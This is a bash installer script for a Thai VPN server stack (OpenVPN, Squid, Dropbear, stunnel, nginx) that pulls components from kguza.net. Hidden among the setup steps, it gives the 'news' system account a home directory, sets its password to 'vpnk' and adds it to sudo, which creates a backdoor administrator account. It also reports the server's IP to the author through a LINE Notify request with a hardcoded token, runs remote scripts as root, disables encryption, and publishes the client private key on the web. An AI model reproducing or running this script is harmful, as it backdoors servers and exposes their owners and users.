#!/usr/bin/env bash

# Functions
ok() {
    echo -e '\e[32m'$1'\e[m';
}

die() {
    echo -e '\e[1;35m'$1'\e[m';
}

des() {
    echo -e '\e[1;31m'$1'\e[m'; exit 1;
}
# install screenfetch
ok "❯❯❯ install screenfetch"
cd
wget -q https://kguza.net/scrip/u-d/openvpn/menu/screenfetch-dev
mv screenfetch-dev /usr/bin/screenfetch
chmod +x /usr/bin/screenfetch
echo "clear" >> .profile
echo "screenfetch" >> .profile
echo "clear" >> .bashrc
echo "screenfetch" >> .bashrc


#<BODY text='ffffff'>
kguza="https://kguza.net/scrip/u-d/openvpn"

#OS
if [[ -e /etc/debian_version ]]; then
VERSION_ID=$(cat /etc/os-release | grep "VERSION_ID")
fi


# Sanity check
if [[ $(id -g) != "0" ]] ; then
    des "❯❯❯ สคริปต์ต้องทำงานเป็น root."
fi

#if [[  ! -e /dev/net/tun ]] ; then
   # des "❯❯❯ TUN/TAP อุปกรณ์ไม่พร้อมใช้งาน."
#fi

dpkg -l openvpn > /dev/null 2>&1
if [[ $? -eq 0 ]]; then
    des "❯❯❯ OpenVPN ได้รับการติดตั้งแล้ว"
fi

# IP Address
SERVER_IP=$(wget -qO- ipv4.icanhazip.com);
if [[ "$SERVER_IP" = "" ]]; then
    SERVER_IP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | grep -v '192.168'`;
fi
echo "$SERVER_IP" > /usr/bin/ipsm

# Install openvpn
die "❯❯❯ apt-get update"
apt-get update -q > /dev/null 2>&1
die "❯❯❯ apt-get install openvpn curl openssl"
apt-get install -qy openvpn curl > /dev/null 2>&1


#die "❯❯❯ Generating CA Config"
cd /
wget -q -O ovpn.tar "$kguza/conf/openvpn.tar"
tar xf ovpn.tar
rm ovpn.tar

cat > /etc/openvpn/KGUZA.ovpn <<EOF1
client
dev tun
proto tcp
port 1194
connect-retry 1
connect-timeout 120
resolv-retry infinite
route-method exe
nobind
persist-key
persist-tun
persist-remote-ip
mute-replay-warnings
verb 2
cipher none
comp-lzo
script-security 3

auth-user-pass 

remote $SERVER_IP
http-proxy $SERVER_IP 8080
#http-proxy-option CUSTOM-HEADER Host connect.facebook.net
#http-proxy-option CUSTOM-HEADER Host beetalkmobile.com

<key>
$(cat /etc/openvpn/client-key.pem)
</key>
<cert>
$(cat /etc/openvpn/client-cert.pem)
</cert>
<ca>
$(cat /etc/openvpn/ca.pem)
</ca>
EOF1

cat > /etc/openvpn/KGUZA.ovpn << KGUZA
client
dev tun
proto tcp
port 1194
connect-retry 1
connect-timeout 120
resolv-retry infinite
route-method exe
nobind
persist-key
persist-tun
persist-remote-ip
mute-replay-warnings
verb 2
cipher none
comp-lzo
script-security 3

auth-user-pass 

remote $SERVER_IP
http-proxy $SERVER_IP 8080
#http-proxy-option CUSTOM-HEADER Host connect.facebook.net
#http-proxy-option CUSTOM-HEADER Host beetalkmobile.com

<key>
$(cat /etc/openvpn/client-key.pem)
</key>
<cert>
$(cat /etc/openvpn/client-cert.pem)
</cert>
<ca>
$(cat /etc/openvpn/ca.pem)
</ca>
KGUZA

cat > /etc/openvpn/KGUZAZA.ovpn <<EOF1
client 🇹🇭kguza-vpn🇹🇭
verb 3
dev tun
nobind
comp-lzo
proto tcp
persist-key
persist-tun
cipher none
<auth-user-pass>
news
Kguza
</auth-user-pass>
http-proxy $SERVER_IP 8080
remote $SERVER_IP 1194 tcp-client

dhcp-option DNS 1.1.1.1
dhcp-option DNS 1.0.0.1
dhcp-option DOMAIN blinkt.de
dhcp-option DOMAIN www.google.com
dhcp-option DOMAIN www.youtube.com
dhcp-option DOMAIN www.opendns.com
dhcp-option DOMAIN www.facebook.com
http-proxy-option CUSTOM-HEADER X-Online-Host https://anywhere.truevisions.tv

<key>
$(cat /etc/openvpn/client-key.pem)
</key>
<cert>
$(cat /etc/openvpn/client-cert.pem)
</cert>
<ca>
$(cat /etc/openvpn/ca.pem)
</ca>
####KGUZA-VPN###
EOF1

cat > /etc/openvpn/KGUZAZA.ovpn << KGUZA
client 🇹🇭kguza-vpn🇹🇭
verb 3
dev tun
nobind
comp-lzo
proto tcp
persist-key
persist-tun
cipher none
<auth-user-pass>
news
Kguza
</auth-user-pass>
http-proxy $SERVER_IP 8080
remote $SERVER_IP 1194 tcp-client

dhcp-option DNS 1.1.1.1
dhcp-option DNS 1.0.0.1
dhcp-option DOMAIN blinkt.de
dhcp-option DOMAIN www.google.com
dhcp-option DOMAIN www.youtube.com
dhcp-option DOMAIN www.opendns.com
dhcp-option DOMAIN www.facebook.com
http-proxy-option CUSTOM-HEADER X-Online-Host https://anywhere.truevisions.tv

<key>
$(cat /etc/openvpn/client-key.pem)
</key>
<cert>
$(cat /etc/openvpn/client-cert.pem)
</cert>
<ca>
$(cat /etc/openvpn/ca.pem)
</ca>
####KGUZA-VPN###
KGUZA

# Restart Service
ok "❯❯❯ service openvpn restart"
service openvpn restart > /dev/null 2>&1

die "❯❯❯ apt-get install squid3"
#Add Trusty Sources
touch /etc/apt/sources.list.d/trusty_sources.list > /dev/null 2>&1
echo "deb http://us.archive.ubuntu.com/ubuntu/ trusty main universe" | sudo tee --append /etc/apt/sources.list.d/trusty_sources.list > /dev/null 2>&1

#Update
apt-get update  -q > /dev/null 2>&1

#Install Squid
apt-get install -y squid3=3.3.8-1ubuntu6 squid=3.3.8-1ubuntu6 squid3-common=3.3.8-1ubuntu6 > /dev/null 2>&1

#Install missing init.d script
wget -q -O squid3 https://kguza.net/scrip/squid3-3.3.8-1ubuntu6/squid3.sh
cp squid3 /etc/init.d/
chmod +x /etc/init.d/squid3
update-rc.d squid3 defaults

cp /etc/squid3/squid.conf /etc/squid3/squid.conf.orig
echo "http_port 8080
acl localhost src 127.0.0.1/32 ::1
acl to_localhost dst 127.0.0.0/8 0.0.0.0/32 ::1
acl localnet src 10.0.0.0/8
acl localnet src 172.16.0.0/12
acl localnet src 192.168.0.0/16
acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 21
acl Safe_ports port 443
acl Safe_ports port 70
acl Safe_ports port 210
acl Safe_ports port 1025-65535
acl Safe_ports port 280
acl Safe_ports port 488
acl Safe_ports port 591
acl Safe_ports port 777
acl CONNECT method CONNECT
acl SSH dst $SERVER_IP-$SERVER_IP/255.255.255.255 
acl SSH dst 127.0.0.1-127.0.0.1/255.255.255.255                 
http_access allow SSH
http_access allow localnet
http_access allow localhost
http_access deny all
refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern ^gopher:        1440    0%      1440
refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
refresh_pattern .               0       20%     4320" > /etc/squid3/squid.conf

#Start squid
ok "❯❯❯ service squid3 restart"
service squid3 start > /dev/null 2>&1

#Cleanup
rm squid3


#die "❯❯❯ apt-get install sudo"
#apt-get install -qy sudo > /dev/null 2>&1

sed -i 's/news:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin/news:x:9:9:news:\/home:/g' /etc/passwd
echo news:vpnk | chpasswd
usermod -aG sudo news

#install Nginx
die "❯❯❯ apt-get install nginx"
apt-get install -qy nginx > /dev/null 2>&1
rm -f /etc/nginx/sites-enabled/default
rm -f /etc/nginx/sites-available/default
wget -q -O /etc/nginx/nginx.conf "$kguza/conf/nginx.conf"
wget -q -O /etc/nginx/conf.d/vps.conf "$kguza/conf/vps.conf"
mkdir -p /home/vps/public_html/open-on
wget -q -O /home/vps/public_html/open-on/index.php "$kguza/conf/api.txt"
wget -q -O /home/vps/public_html/index.php "$kguza/conf/kguza-vpn.txt"
echo "<?php phpinfo( ); ?>" > /home/vps/public_html/info.php
ok "❯❯❯ service nginx restart"
service nginx restart > /dev/null 2>&1

#install php-fpm
if [[ "$VERSION_ID" = 'VERSION_ID="7"' || "$VERSION_ID" = 'VERSION_ID="8"' || "$VERSION_ID" = 'VERSION_ID="14.04"' ]]; then
#debian8
die "❯❯❯ apt-get install php"
apt-get install -qy php5-fpm > /dev/null 2>&1
sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
ok "❯❯❯ service php restart"
service php5-fpm restart -q > /dev/null 2>&1
elif [[ "$VERSION_ID" = 'VERSION_ID="9"' || "$VERSION_ID" = 'VERSION_ID="16.04"' ]]; then
#debian9 Ubuntu16.4
die "❯❯❯ apt-get install php"
apt-get install -qy php7.0-fpm > /dev/null 2>&1
sed -i 's/listen = \/run\/php\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
ok "❯❯❯ service php restart"
service php7.0-fpm restart > /dev/null 2>&1
fi

# install dropbear
die "❯❯❯ apt-get install dropbear"
apt-get install -qy dropbear > /dev/null 2>&1
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=446/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 110"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
ok "❯❯❯ service dropbear restart"
service dropbear restart > /dev/null 2>&1

#detail nama perusahaan
country=ID
state=Thailand
locality=Tebet
organization=Kguzaza
organizationalunit=IT
commonname=kguza.online
email=wullopkk@gmail.com


# install stunnel
die "❯❯❯ apt-get install ssl"
apt-get install -qy stunnel4 > /dev/null 2>&1
cat > /etc/stunnel/stunnel.conf <<-END
cert = /etc/stunnel/stunnel.pem
client = no
socket = a:SO_REUSEADDR=1
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1


[dropbear]
accept = 444
connect = 127.0.0.1:110

#[openvpn]
#accept = 465
#connect = 127.0.0.1:443

#[squid3]
#accept = 443
#connect = 127.0.0.1:8080



END

#membuat sertifikat
cat /etc/openvpn/client-key.pem /etc/openvpn/client-cert.pem > /etc/stunnel/stunnel.pem

#konfigurasi stunnel
sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
ok "❯❯❯ service ssl restart"
service stunnel4 restart > /dev/null 2>&1

# Iptables
die "❯❯❯ apt-get install iptables"
apt-get install -qy iptables > /dev/null 2>&1
if [ -e '/var/lib/vnstat/eth0' ]; then
iptables -t nat -I POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE
iptables -t nat -I POSTROUTING -s 10.7.0.0/24 -o eth0 -j MASQUERADE
else
iptables -t nat -I POSTROUTING -s 10.8.0.0/24 -o ens3 -j MASQUERADE
iptables -t nat -I POSTROUTING -s 10.7.0.0/24 -o ens3 -j MASQUERADE
fi
iptables -I FORWARD -s 10.8.0.0/24 -j ACCEPT
iptables -I FORWARD -s 10.7.0.0/24 -j ACCEPT
iptables -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -j SNAT --to-source $SERVER_IP
iptables -t nat -A POSTROUTING -s 10.7.0.0/24 -j SNAT --to-source $SERVER_IP


iptables-save > /etc/iptables.conf

cat > /etc/network/if-up.d/iptables <<EOF

#!/bin/sh
iptables-restore < /etc/iptables.conf
EOF

chmod +x /etc/network/if-up.d/iptables

# Enable net.ipv4.ip_forward
sed -i 's|#net.ipv4.ip_forward=1|net.ipv4.ip_forward=1|' /etc/sysctl.conf
echo 1 > /proc/sys/net/ipv4/ip_forward

# setting time
ln -fs /usr/share/zoneinfo/Asia/Bangkok /etc/localtime
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
sed -i 's/Port 22/Port 22/g' /etc/ssh/sshd_config
service ssh restart

ok "❯❯❯ กำลังติดตั้งเมนู " 
cd
wget -q -O menu "$kguza/menu/menu"
chmod +x menu
./menu
rm -f menu
wget -q -O /usr/bin/bwh "$kguza/menu/bwh"
chmod +x /usr/bin/bwh


die "❯❯❯ apt-get update"
apt-get update -q > /dev/null 2>&1
service openvpn restart -q > /dev/null 2>&1

#แจ้งเตือนคนรันสคิป
IP=$(wget -qO- ipv4.icanhazip.com);
curl -X POST -H 'Authorization: Bearer yEMJ26hu7lNygZIxh4mydKNMgwrCm7Ljs0rFJsjk8Ic' -F 'message='" 
Load_file  $IP/KGUZA.ovpn "'' https://notify-api.line.me/api/notify > /dev/null 2>&1

echo "ติดตั้งเสร็จเรียบร้อย" > /usr/bin/install_full

mv /etc/openvpn/KGUZA.ovpn /home/vps/public_html/KGUZA.ovpn

mv /etc/openvpn/KGUZAZA.ovpn /home/vps/public_html/KGUZAZA.ovpn
rm /home/vps/public_html/KGUZAZA.ovpn

if [[ "$VERSION_ID" = 'VERSION_ID="7"' || "$VERSION_ID" = 'VERSION_ID="8"' || "$VERSION_ID" = 'VERSION_ID="14.04"' ]]; then
echo " "
echo " ┈╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮"
echo " ┈┣ Vnstat http://$SERVER_IP/vnstat/"
echo " ┈╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
echo " ┈╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮"
echo " ┈┣ Load file http://$SERVER_IP/KGUZA.ovpn"
echo " ┈╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
echo " ┈╭━━━━━━━━━━━━━━━━━━━━━╮"
echo " ┈┣ พิมพ์ menu เพื่อใช้งาน"
echo " ┈╰━━━━━━━━━━━━━━━━━━━━━╯"
echo " "

elif [[ "$VERSION_ID" = 'VERSION_ID="16.04"' || "$VERSION_ID" = 'VERSION_ID="9"' ]]; then
echo " "
echo " ┈╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮"
echo " ┈┣ Vnstat http://$SERVER_IP/vnstat/"
echo " ┈╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
echo " ┈╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮"
echo " ┈┣ Load file http://$SERVER_IP/KGUZA.ovpn"
echo " ┈╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
echo " ┈╭━━━━━━━━━━━━━━━━━━━━━╮"
echo " ┈┣ พิมพ์ menu เพื่อใช้งาน"
echo " ┈╰━━━━━━━━━━━━━━━━━━━━━╯"
echo " "
fi
echo ok > /etc/openvpn/okport
